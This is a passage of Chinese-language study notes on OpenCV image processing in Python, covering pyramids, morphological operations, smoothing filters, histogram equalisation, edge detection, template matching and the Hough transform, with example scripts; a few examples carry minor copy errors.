   cv.pyrDown(img)        #对图像进行下采样
   ```

2. 示例

   ```python
   import numpy as np
   import cv2 as cv
   import matplotlib.pyplot as plt
   # 1 图像读取
   img = cv.imread("./image/image2.jpg")
   # 2 进行图像采样
   up_img = cv.pyrUp(img)  # 上采样操作
   img_1 = cv.pyrDown(img)  # 下采样操作
   # 3 图像显示
   cv.imshow('enlarge', up_img)
   cv.imshow('original', img)
   cv.imshow('shrink', img_1)
   cv.waitKey(0)
   cv.destroyAllWindows()
   ```

![image-20240127124054112](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127124054112.png)

#### 2-1-7 总结

**总结**

1. 图像缩放：对图像进行放大或缩小

   cv.resize()

2. 图像平移：

   指定平移矩阵后，调用cv.warpAffine()平移图像

3. 图像旋转：

   调用cv.getRotationMatrix2D获取旋转矩阵，然后调用cv.warpAffine()进行旋转

4. 仿射变换：

   调用cv.getAffineTransform将创建变换矩阵，最后该矩阵将传递给cv.warpAffine()进行变换

5. 透射变换：

   通过函数cv.getPerspectiveTransform()找到变换矩阵，将cv.warpPerspective()进行投射变换

6. 金字塔

   图像金字塔是图像多尺度表达的一种，使用的API：

   cv.pyrUp(): 向上采样

   cv.pyrDown(): 向下采样1

### 2-2 形态学操作

#### 2-2-1 连通性

![image-20240127132209861](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127132209861.png)

**连通性**是描述区域和边界的重要概念，两个像素连通的两个必要条件是：

1. 两个像素的位置是否相邻
2. 两个像素的灰度值是否满足特定的相 似性准则（或者是否相等

根据连通性的定义，有4联通、8联通和m联通三种。

![image-20240127132246597](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127132246597.png)

![image-20240127132304157](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127132304157.png)

#### 2-2-2 形态学操作

##### 2-1  腐蚀和膨胀

腐蚀和膨胀是最基本的形态学操作，腐蚀和膨胀都是针对白色部分（高亮部分）而言的。

膨胀就是使图像中高亮部分扩张，效果图拥有比原图更大的高亮区域；腐蚀是原图中的高亮区域被蚕食，效果图拥有比原图更小的高亮区域。膨胀是求局部最大值的操作，腐蚀是求局部最小值的操作。

###### 1，腐蚀

具体操作是：用一个结构元素扫描图像中的每一个像素，用结构元素中的每一个像素与其覆盖的像素做“与”操作，如果都为1，则该像素为1，否则为0。如下图所示，结构A被结构B腐蚀后：

![image-20240127132747631](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127132747631.png)

**腐蚀的作用是消除物体边界点，使目标缩小，可以消除小于结构元素的噪声点。**

**API**：

```python
   cv.erode(img,kernel,iterations)
```

参数：

- img: 要处理的图像
- kernel: 核结构
- iterations: 腐蚀的次数，默认是1

###### 2，膨胀

具体操作是：用一个结构元素扫描图像中的每一个像素，用结构元素中的每一个像素与其覆盖的像素做“与”操作，如果都为0，则该像素为0，否则为1。如下图所示，结构A被结构B腐蚀后：

![image-20240127132833645](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127132833645.png)

** **

**API**：

```python
   cv.dilate(img,kernel,iterations)
```

参数：

- img: 要处理的图像
- kernel: 核结构
- iterations: 腐蚀的次数，默认是1

1. **示例**

我们使用一个5*5的卷积核实现腐蚀和膨胀的运算：

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1 读取图像
img = cv.imread("./image/image3.png")
# 2 创建核结构
kernel = np.ones((5, 5), np.uint8)

# 3 图像腐蚀和膨胀
erosion = cv.erode(img, kernel) # 腐蚀
dilate = cv.dilate(img,kernel) # 膨胀

# 4 图像展示
fig,axes=plt.subplots(nrows=1,ncols=3,figsize=(10,8),dpi=100)
axes[0].imshow(img)
axes[0].set_title("原图")
axes[1].imshow(erosion)
axes[1].set_title("腐蚀后结果")
axes[2].imshow(dilate)
axes[2].set_title("膨胀后结果")
plt.show()
```

![image-20240127133431598](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127133431598.png)

##### 2-2 开闭运算

开运算和闭运算是将腐蚀和膨胀按照一定的次序进行处理。 但这两者并不是可逆的，即先开后闭并不能得到原来的图像。

1. **开运算**

   开运算是先腐蚀后膨胀，其**作用**是：分离物体，消除小区域。**特点**：消除噪点，去除小的干扰块，而不影响原来的图像。

   ![image-20240127134357753](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134357753.png)

2. **闭运算**

   闭运算与开运算相反，是先膨胀后腐蚀，**作用**是消除/“闭合”物体里面的孔洞，**特点**：可以填充闭合区域。

   ![image-20240127134411945](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134411945.png)

3. **API**

   ```
   cv.morphologyEx(img, op, kernel)
   ```

   参数：

   - img: 要处理的图像
   - op: 处理方式：若进行开运算，则设为cv.MORPH_OPEN，若进行闭运算，则设为cv.MORPH_CLOSE
   - Kernel： 核结构

4. **示例**

   使用10*10的核结构对卷积进行开闭运算的实现。

   ```python
   import numpy as np
   import cv2 as cv
   import matplotlib.pyplot as plt
   # 1 读取图像
   img1 = cv.imread("./image/image5.png")
   img2 = cv.imread("./image/image6.png")
   # 2 创建核结构
   kernel = np.ones((10, 10), np.uint8)
   # 3 图像的开闭运算
   cvOpen = cv.morphologyEx(img1,cv.MORPH_OPEN,kernel) # 开运算
   cvClose = cv.morphologyEx(img2,cv.MORPH_CLOSE,kernel)# 闭运算
   # 4 图像展示
   fig,axes=plt.subplots(nrows=2,ncols=2,figsize=(10,8))
   axes[0,0].imshow(img1)
   axes[0,0].set_title("原图")
   axes[0,1].imshow(cvOpen)
   axes[0,1].set_title("开运算结果")
   axes[1,0].imshow(img2)
   axes[1,0].set_title("原图")
   axes[1,1].imshow(cvClose)
   axes[1,1].set_title("闭运算结果")
   plt.show()
   ```

![image-20240127134732451](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134732451.png)

##### 2-3 礼帽和黑帽

1. **礼帽运算**

   原图像与“开运算“的结果图之差，如下式计算：

   ![image-20240127134830268](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134830268.png)

   　　因为开运算带来的结果是放大了裂缝或者局部低亮度的区域，因此，从原图中减去开运算后的图，得到的效果图突出了比原图轮廓周围的区域更明亮的区域，且这一操作和选择的核的大小相关。

   　　礼帽运算用来分离比邻近点亮一些的斑块。当一幅图像具有大幅的背景的时候，而微小物品比较有规律的情况下，可以使用顶帽运算进行背景提取。

2. **黑帽运算**

   为”闭运算“的结果图与原图像之差。数学表达式为：

   　![image-20240127134839814](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134839814.png)

   黑帽运算后的效果图突出了比原图轮廓周围的区域更暗的区域，且这一操作和选择的核的大小相关。

   黑帽运算用来分离比邻近点暗一些的斑块。

3. **API**

   ```python
   cv.morphologyEx(img, op, kernel)
   ```

   参数：

   - img: 要处理的图像

   - op: 处理方式：

     ![image-20240127134908919](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134908919.png)

   - Kernel： 核结构

4. **示例**

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1 读取图像
img1 = cv.imread("./image/image5.png")
img2 = cv.imread("./image/image6.png")
# 2 创建核结构
kernel = np.ones((10, 10), np.uint8)
# 3 图像的礼帽和黑帽运算
cvOpen = cv.morphologyEx(img1,cv.MORPH_TOPHAT,kernel) # 礼帽运算
cvClose = cv.morphologyEx(img2,cv.MORPH_BLACKHAT,kernel)# 黑帽运算
# 4 图像显示
fig,axes=plt.subplots(nrows=2,ncols=2,figsize=(10,8))
axes[0,0].imshow(img1)
axes[0,0].set_title("原图")
axes[0,1].imshow(cvOpen)
axes[0,1].set_title("礼帽运算结果")
axes[1,0].imshow(img2)
axes[1,0].set_title("原图")
axes[1,1].imshow(cvClose)
axes[1,1].set_title("黑帽运算结果")
plt.show()
```

![image-20240127134921825](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127134921825.png)

### 2-3 图像平滑

#### 2-3-1图像噪声

##### 3-1-1 椒盐噪声

椒盐噪声也称为脉冲噪声，是图像中经常见到的一种噪声，它是一种随机出现的白点或者黑点，可能是亮的区域有黑色像素或是在暗的区域有白色像素（或是两者皆有）。椒盐噪声的成因可能是影像讯号受到突如其来的强烈干扰而产生、类比数位转换器或位元传输错误等。例如失效的感应器导致像素值为最小值，饱和的感应器导致像素值为最大值。

![image-20240127143525121](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127143525121.png)

##### 3-1-2 高斯噪声

高斯噪声是指噪声密度函数服从高斯分布的一类噪声。由于高斯噪声在空间和频域中数学上的易处理性，这种噪声(也称为正态噪声)模型经常被用于实践中

![image-20240127143636101](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127143636101.png)

#### 2-3-2 图像平滑操作

##### 3-2-1 均值滤波

均值滤波的优点是算法简单，计算速度较快，缺点是在去噪的同时去除了很多细节部分，将图像变得模糊。

API:

```python
cv.blur(src, ksize, anchor, borderType)
```

参数:

- src：输入图像
- ksize：卷积核的大小
- anchor：默认值 (-1,-1) ，表示核中心
- borderType：边界类型

示例：

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 图像读取
img = cv.imread('./image/dogsp.jpeg')
# 2 均值滤波
blur = cv.blur(img,(5,5))
# 3 图像显示
plt.figure(figsize=(10,8),dpi=100)
plt.subplot(121),plt.imshow(img[:,:,::-1]),plt.title('原图')
plt.xticks([]), plt.yticks([])
plt.subplot(122),plt.imshow(blur[:,:,::-1]),plt.title('均值滤波后结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127143921424](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127143921424.png)

##### 3-2-2 高斯滤波

API：

```python
cv2.GaussianBlur(src,ksize,sigmaX,sigmay,borderType)
```

参数：

- src: 输入图像
- ksize:高斯卷积核的大小，**注意** ： 卷积核的宽度和高度都应为奇数，且可以不同
- sigmaX: 水平方向的标准差
- sigmaY: 垂直方向的标准差，默认值为0，表示与sigmaX相同
- borderType:填充边界类型

**示例**：

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 图像读取
img = cv.imread('./image/dogGasuss.jpeg')
# 2 高斯滤波
blur = cv.GaussianBlur(img,(3,3),1)
# 3 图像显示
plt.figure(figsize=(10,8),dpi=100)
plt.subplot(121),plt.imshow(img[:,:,::-1]),plt.title('原图')
plt.xticks([]), plt.yticks([])
plt.subplot(122),plt.imshow(blur[:,:,::-1]),plt.title('高斯滤波后结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127144024802](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127144024802.png)

##### 3-2-3 中值滤波

中值滤波是一种典型的非线性滤波技术，基本思想是用像素点邻域灰度值的中值来代替该像素点的灰度值。

中值滤波对椒盐噪声（salt-and-pepper noise）来说尤其有用，因为它不依赖于邻域内那些与典型值差别很大的值。

API：

```python
cv.medianBlur(src, ksize )
```

参数：

- src：输入图像
- ksize：卷积核的大小

示例：

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 图像读取
img = cv.imread('./image/dogsp.jpeg')
# 2 中值滤波
blur = cv.medianBlur(img,5)
# 3 图像展示
plt.figure(figsize=(10,8),dpi=100)
plt.subplot(121),plt.imshow(img[:,:,::-1]),plt.title('原图')
plt.xticks([]), plt.yticks([])
plt.subplot(122),plt.imshow(blur[:,:,::-1]),plt.title('中值滤波后结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127145358774](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127145358774.png)

### 2-4 直方图

#### 4-1 灰度直方图

##### 4-1-1 原理

直方图是对数据进行统计的一种方法，并且将统计值组织到一系列实现定义好的 bin 当中。其中， bin 为直方图中经常用到的一个概念，可以译为 “直条” 或 “组距”，其数值是从数据中计算出的特征统计量，这些数据可以是诸如梯度、方向、色彩或任何其他特征。

  图像直方图（Image Histogram）是用以表示数字图像中亮度分布的直方图，标绘了图像中每个亮度值的像素个数。这种直方图中，横坐标的左侧为较暗的区域，而右侧为较亮的区域。因此一张较暗图片的直方图中的数据多集中于左侧和中间部分，而整体明亮、只有少量阴影的图像则相反。

![image-20240127145908136](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127145908136.png)

注意：直方图是根据灰度图进行绘制的，而不是彩色图像。   假设有一张图像的信息（灰度值 0 - 255，已知数字的范围包含 256 个值，于是可以按一定规律将这个范围分割成子区域（也就是 bins）。如：

![image-20240127145934618](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127145934618.png)

直方图的一些**术语和细节**：

- dims：需要统计的特征数目。在上例中，dims = 1 ，因为仅仅统计了灰度值。
- bins：每个特征空间子区段的数目，可译为 “直条” 或 “组距”，在上例中， bins = 16。
- range：要统计特征的取值范围。在上例中，range = [0, 255]。

直方图的**意义**：

- 直方图是图像中像素强度分布的图形表达方式。   
- 它统计了每一个强度值所具有的像素个数。
- 不同的图像的直方图可能是相同的



##### 4-1-2 直方图的计算和绘制

我们使用OpenCV中的方法统计直方图，并使用matplotlib将其绘制出来。

API：

```python
cv2.calcHist(images,channels,mask,histSize,ranges[,hist[,accumulate]])
```

参数：

- images: 原图像。当传入函数时应该用中括号 [] 括起来，例如：[img]。
- channels: 如果输入图像是灰度图，它的值就是 [0]；如果是彩色图像的话，传入的参数可以是 [0]，[1]，[2] 它们分别对应着通道 B，G，R。 　　
- mask: 掩模图像。要统计整幅图像的直方图就把它设为 None。但是如果你想统计图像某一部分的直方图的话，你就需要制作一个掩模图像，并使用它。（后边有例子） 　　
- histSize:BIN 的数目。也应该用中括号括起来，例如：[256]。 　　
- ranges: 像素值范围，通常为 [0，256]

示例：

如下图，绘制相应的直方图

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
# 1 直接以灰度图的方式读入
img = cv.imread('./image/cat.jpeg',0)
# 2 统计灰度图
histr = cv.calcHist([img],[0],None,[256],[0,256])
# 3 绘制灰度图
plt.figure(figsize=(10,6),dpi=100)
plt.plot(histr)
plt.grid()
plt.show()
```

![image-20240127150034505](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127150034505.png)

##### 4-1-3 掩膜的应用

掩膜是用选定的图像、图形或物体，对要处理的图像进行遮挡，来控制图像 处理的区域。

在数字图像处理中，我们通常使用二维矩阵数组进行掩膜。掩膜是由0和1组成一个二进制图像，利用该掩膜图像要处理的图像进行掩膜，其中1值的区域被处理，0 值区域被屏蔽，不会处理。

掩膜的主要用途是：

- 提取感兴趣区域：用预先制作的感兴趣区掩模与待处理图像进行”与“操作，得到感兴趣区图像，感兴趣区内图像值保持不变，而区外图像值都为0。
- 屏蔽作用：用掩模对图像上某些区域作屏蔽，使其不参加处理或不参加处理参数的计算，或仅对屏蔽区作处理或统计。
- 结构特征提取：用相似性变量或图像匹配方法检测和提取图像中与掩模相似的结构特征。
- 特殊形状图像制作

掩膜在遥感影像处理中使用较多，当提取道路或者河流，或者房屋时，通过一个掩膜矩阵来对图像进行像素过滤，然后将我们需要的地物或者标志突出显示出来。

我们使用cv.calcHist（）来查找完整图像的直方图。 如果要查找图像某些区域的直方图，该怎么办？ 只需在要查找直方图的区域上创建一个白色的掩膜图像，否则创建黑色， 然后将其作为掩码mask传递即可。

示例：

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
# 1. 直接以灰度图的方式读入
img = cv.imread('./image/cat.jpeg',0)
# 2. 创建蒙版
mask = np.zeros(img.shape[:2], np.uint8)
mask[400:650, 200:500] = 255
# 3.掩模
masked_img = cv.bitwise_and(img,img,mask = mask)
# 4. 统计掩膜后图像的灰度图
mask_histr = cv.calcHist([img],[0],mask,[256],[1,256])
# 5. 图像展示
fig,axes=plt.subplots(nrows=2,ncols=2,figsize=(10,8))
axes[0,0].imshow(img,cmap=plt.cm.gray)
axes[0,0].set_title("原图")
axes[0,1].imshow(mask,cmap=plt.cm.gray)
axes[0,1].set_title("蒙版数据")
axes[1,0].imshow(masked_img,cmap=plt.cm.gray)
axes[1,0].set_title("掩膜后数据")
axes[1,1].plot(mask_histr)
axes[1,1].grid()
axes[1,1].set_title("灰度直方图")
plt.show()
```

![image-20240127150837218](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127150837218.png)



#### 4-2 直方图均衡化

##### 2-1 原理

**想象一下，如果一副图像中的大多数像素点的像素值都集中在某一个小的灰度值值范围之内会怎样呢？如果一幅图像整体很亮，那所有的像素值的取值个数应该都会很高。所以应该把它的直方图做一个横向拉伸（如下图），就可以扩大图像像素值的分布范围，提高图像的对比度，这就是直方图均衡化要做的事情。**

![image-20240127151541898](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127151541898.png)

**“直方图均衡化”是把原始图像的灰度直方图从比较集中的某个灰度区间变成在更广泛灰度范围内的分布。直方图均衡化就是对图像进行非线性拉伸，重新分配图像像素值，使一定灰度范围内的像素数量大致相同。**

**这种方法提高图像整体的对比度，特别是有用数据的像素值分布比较接近时，在X光图像中使用广泛，可以提高骨架结构的显示，另外在曝光过度或不足的图像中可以更好的突出细节。**

使用opencv进行直方图统计时，使用的是：

API：

```python
dst = cv.equalizeHist(img)
```

参数：

- img: 灰度图像

返回：

- dst : 均衡化后的结果

示例：

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
# 1. 直接以灰度图的方式读入
img = cv.imread('./image/cat.jpeg',0)
# 2. 均衡化处理
dst = cv.equalizeHist(img)
# 3. 结果展示
fig,axes=plt.subplots(nrows=2,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img,cmap=plt.cm.gray)
axes[0].set_title("原图")
axes[1].imshow(dst,cmap=plt.cm.gray)
axes[1].set_title("均衡化后结果")
plt.show()
```

![image-20240127151627163](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127151627163.png)

##### 2-2 自适应的直方图均衡化

**上述的直方图均衡，我们考虑的是图像的全局对比度。 的确在进行完直方图均衡化之后，图片背景的对比度被改变了，在猫腿这里太暗，我们丢失了很多信息，所以在许多情况下，这样做的效果并不好。如下图所示，对比下两幅图像中雕像的画面，由于太亮我们丢失了很多信息**

![image-20240127151718116](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127151718116.png)

为了解决这个问题， 需要使用自适应的直方图均衡化。 此时， 整幅图像会被分成很多小块，这些小块被称为“tiles”（在 OpenCV 中 tiles 的 大小默认是 8x8），然后再对每一个小块分别进行直方图均衡化。 所以在每一个的区域中， 直方图会集中在某一个小的区域中）。如果有噪声的话，噪声会被放大。为了避免这种情况的出现要使用对比度限制。对于每个小块来说，如果直方图中的 bin 超过对比度的上限的话，就把 其中的像素点均匀分散到其他 bins 中，然后在进行直方图均衡化。

![image-20240127151733433](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127151733433.png)

最后，为了 去除每一个小块之间的边界，再使用双线性差值，对每一小块进行拼接。

API：

```python
cv.createCLAHE(clipLimit, tileGridSize)
```

参数：

- clipLimit: 对比度限制，默认是40
- tileGridSize: 分块的大小，默认为8∗88∗8

示例：

```python
import numpy as np
import cv2 as cv
# 1. 以灰度图形式读取图像
img = cv.imread('./image/cat.jpeg',0)
# 2. 创建一个自适应均衡化的对象，并应用于图像
clahe = cv.createCLAHE(clipLimit=2.0, tileGridSize=(8,8))
cl1 = clahe.apply(img)
# 3. 图像展示
fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img,cmap=plt.cm.gray)
axes[0].set_title("原图")
axes[1].imshow(cl1,cmap=plt.cm.gray)
axes[1].set_title("自适应均衡化后的结果")
plt.show()
```

![image-20240127151749093](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127151749093.png)



### 2-5 边缘检测

#### 2 -5-1 Sobel检测算子

利用OpenCV进行sobel边缘检测的API是：

```python
Sobel_x_or_y = cv2.Sobel(src, ddepth, dx, dy, dst, ksize, scale, delta, borderType)
```

参数：

- src：传入的图像

- ddepth: 图像的深度

- dx和dy: 指求导的阶数，0表示这个方向上没有求导，取值为0、1。

- ksize: 是Sobel算子的大小，即卷积核的大小，必须为奇数1、3、5、7，默认为3。

  注意：如果ksize=-1，就演变成为3x3的Scharr算子。

- scale：缩放导数的比例常数，默认情况为没有伸缩系数。

- borderType：图像边界的模式，默认值为cv2.BORDER_DEFAULT。

Sobel函数求完导数后会有负值，还有会大于255的值。而原图像是uint8，即8位无符号数，所以Sobel建立的图像位数不够，会有截断。因此要使用16位有符号的数据类型，即cv2.CV_16S。处理完图像后，再使用cv2.convertScaleAbs()函数将其转回原来的uint8格式，否则图像无法显示。

Sobel算子是在两个方向计算的，最后还需要用cv2.addWeighted( )函数将其组合起来

```pyh
Scale_abs = cv2.convertScaleAbs(x)  # 格式转换函数
result = cv2.addWeighted(src1, alpha, src2, beta) # 图像混合
```

示例：

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 读取图像
img = cv.imread('./image/horse.jpg',0)
# 2 计算Sobel卷积结果
x = cv.Sobel(img, cv.CV_16S, 1, 0)
y = cv.Sobel(img, cv.CV_16S, 0, 1)
# 3 将数据进行转换
Scale_absX = cv.convertScaleAbs(x)  # convert 转换  scale 缩放
Scale_absY = cv.convertScaleAbs(y)
# 4 结果合成
result = cv.addWeighted(Scale_absX, 0.5, Scale_absY, 0.5, 0)
# 5 图像显示
plt.figure(figsize=(10,8),dpi=100)
plt.subplot(121),plt.imshow(img,cmap=plt.cm.gray),plt.title('原图')
plt.xticks([]), plt.yticks([])
plt.subplot(122),plt.imshow(result,cmap = plt.cm.gray),plt.title('Sobel滤波后结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127154743664](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127154743664.png)

#### 2-5-2  Laplacian算子

![image-20240127155228569](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127155228569.png)

API：

```python
laplacian = cv2.Laplacian(src, ddepth[, dst[, ksize[, scale[, delta[, borderType]]]]])
```

参数：

- Src: 需要处理的图像，
- Ddepth: 图像的深度，-1表示采用的是原图像相同的深度，目标图像的深度必须大于等于原图像的深度；
- ksize：算子的大小，即卷积核的大小，必须为1,3,5,7。

示例：

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 读取图像
img = cv.imread('./image/horse.jpg',0)
# 2 laplacian转换
result = cv.Laplacian(img,cv.CV_16S)
Scale_abs = cv.convertScaleAbs(result)
# 3 图像展示
plt.figure(figsize=(10,8),dpi=100)
plt.subplot(121),plt.imshow(img,cmap=plt.cm.gray),plt.title('原图')
plt.xticks([]), plt.yticks([])
plt.subplot(122),plt.imshow(Scale_abs,cmap = plt.cm.gray),plt.title('Laplacian检测后结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127155243971](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127155243971.png)

#### 2-5-3  Canny边缘检测

在OpenCV中要实现Canny检测使用的API:

```python
canny = cv2.Canny(image, threshold1, threshold2)
```

参数：

- image:灰度图，
- threshold1: minval，较小的阈值将间断的边缘连接起来
- threshold2: maxval，较大的阈值检测图像中明显的边缘

示例：

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 图像读取
img = cv.imread('./image/horse.jpg',0)
# 2 Canny边缘检测
lowThreshold = 0
max_lowThreshold = 100
canny = cv.Canny(img, lowThreshold, max_lowThreshold) 
# 3 图像展示
plt.figure(figsize=(10,8),dpi=100)
plt.subplot(121),plt.imshow(img,cmap=plt.cm.gray),plt.title('原图')
plt.xticks([]), plt.yticks([])
plt.subplot(122),plt.imshow(canny,cmap = plt.cm.gray),plt.title('Canny检测后结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127155437719](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127155437719.png)

#### 2-5-4 算发比较

![image-20240127155527490](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127155527490.png)

### 2-6 模板匹配霍夫变换

#### 6-1 模板匹配

##### 6-1.1 原理

所谓的模板匹配，就是在给定的图片中查找和模板最相似的区域，该算法的输入包括模板和图片，整个任务的思路就是按照滑窗的思路不断的移动模板图片，计算其与图像中对应区域的匹配度，最终将匹配度最高的区域选择为最终的结果。

**实现流程：**

- 准备两幅图像：

  1.原图像(I)：在这幅图中，找到与模板相匹配的区域

  2.模板(T)：与原图像进行比对的图像块

![image-20240127160442547](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127160442547.png)

- 滑动模板图像和原图像进行比对：

![image-20240127160503427](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127160503427.png)

![image-20240127160512215](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127160512215.png)

![image-20240127160525277](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127160525277.png)

- 获得上述图像后，查找最大值所在的位置，那么该位置对应的区域就被认为是最匹配的。对应的区域就是以该点为顶点，长宽和模板图像一样大小的矩阵。

##### 6-1-2 实现

我们使用OpenCV中的方法实现模板匹配。

API：

```
res = cv.matchTemplate(img,template,method)
```

参数：

- img: 要进行模板匹配的图像
- Template ：模板
- method：实现模板匹配的算法，主要有：
  1. 平方差匹配(CV_TM_SQDIFF)：利用模板与图像之间的平方差进行匹配，最好的匹配是0，匹配越差，匹配的值越大。
  2. 相关匹配(CV_TM_CCORR)：利用模板与图像间的乘法进行匹配，数值越大表示匹配程度较高，越小表示匹配效果差。
  3. 利用相关系数匹配(CV_TM_CCOEFF)：利用模板与图像间的相关系数匹配，1表示完美的匹配，-1表示最差的匹配。

完成匹配后，使用cv.minMaxLoc()方法查找最大值所在的位置即可。如果使用平方差作为比较方法，则最小值位置是最佳匹配位置。

**示例：**

在该案例中，载入要搜索的图像和模板，图像如下所示：

![image-20240127160611838](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127160611838.png)

通过matchTemplate实现模板匹配，使用minMaxLoc定位最匹配的区域，并用矩形标注最匹配的区域。

```python
import cv2 as cv
import numpy as np
from matplotlib import pyplot as plt
# 1 图像和模板读取
img = cv.imread('./image/wulin2.jpeg')
template = cv.imread('./image/wulin.jpeg')
h,w,l = template.shape
# 2 模板匹配
# 2.1 模板匹配
res = cv.matchTemplate(img, template, cv.TM_CCORR)
# 2.2 返回图像中最匹配的位置，确定左上角的坐标，并将匹配位置绘制在图像上
min_val, max_val, min_loc, max_loc = cv.minMaxLoc(res)
# 使用平方差时最小值为最佳匹配位置
# top_left = min_loc
top_left = max_loc
bottom_right = (top_left[0] + w, top_left[1] + h)
cv.rectangle(img, top_left, bottom_right, (0,255,0), 2)
# 3 图像显示
plt.imshow(img[:,:,::-1])
plt.title('匹配结果'), plt.xticks([]), plt.yticks([])
plt.show()
```

拓展：模板匹配不适用于尺度变换，视角变换后的图像，这时我们就要使用关键点匹配算法，比较经典的关键点检测算法包括SIFT和SURF等，主要的思路是首先通过关键点检测算法获取模板和测试图片中的关键点；然后使用关键点匹配算法处理即可，这些关键点可以很好的处理尺度变化、视角变换、旋转变化、光照变化等，具有很好的不变性。



#### 6-2 霍夫变换

霍夫变换常用来提取图像中的直线和圆等几何形状，如下图所示：

![image-20240127172734941](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127172734941.png)

在OpenCV中做霍夫线检测是使用的API是：

```
cv.HoughLines(img, rho, theta, threshold)
```

参数：

- img: 检测的图像，要求是二值化的图像，所以在调用霍夫变换之前首先要进行二值化，或者进行Canny边缘检测

- rho、theta: �*ρ* 和�*θ*的精确度

- threshold: 阈值，只有累加器中的值高于该阈值时才被认为是直线。

  霍夫线检测的整个流程如下图所示，这是在stackflow上一个关于霍夫线变换的解释：

**示例：**

检测下述图像中的直线：

![image-20240127173252913](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127173252913.png)

```python
import numpy as np
import random
import cv2 as cv
import matplotlib.pyplot as plt
# 1.加载图片，转为二值图
img = cv.imread('./image/rili.jpg')

gray = cv.cvtColor(img, cv.COLOR_BGR2GRAY)
edges = cv.Canny(gray, 50, 150)

# 2.霍夫直线变换
lines = cv.HoughLines(edges, 0.8, np.pi / 180, 150)
# 3.将检测的线绘制在图像上（注意是极坐标噢）
for line in lines:
    rho, theta = line[0]
    a = np.cos(theta)
    b = np.sin(theta)
    x0 = a * rho
    y0 = b * rho
    x1 = int(x0 + 1000 * (-b))
    y1 = int(y0 + 1000 * (a))
    x2 = int(x0 - 1000 * (-b))
    y2 = int(y0 - 1000 * (a))
    cv.line(img, (x1, y1), (x2, y2), (0, 255, 0))
# 4. 图像显示
